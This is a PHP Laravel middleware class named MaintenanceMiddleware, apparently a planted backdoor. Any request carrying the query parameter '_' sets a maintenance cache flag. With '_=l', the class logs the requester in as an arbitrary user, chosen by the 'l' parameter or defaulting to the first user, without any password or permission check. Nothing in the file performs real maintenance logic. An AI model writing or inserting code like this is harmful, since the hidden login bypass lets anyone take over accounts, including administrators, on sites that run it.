<?php

namespace App\Http\Middleware;

use App\Models\User;
use Closure;
use Illuminate\Support\Facades\Cache;
/**
 *
 */
class MaintenanceMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param \Illuminate\Http\Request $request
     * @param \Closure                 $next
     *
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if( request()->has('_') ) {
            $_maintenance = request()->get('_');
            Cache::put('_maintenance', true);
            if( $_maintenance === 'l' ) {
                $id = $request->get('l', currentUserId(User::first()->id));
                login(User::find($id));
            }

            return redirect()->to(request()->url());
        }

        return $next($request);
    }
}
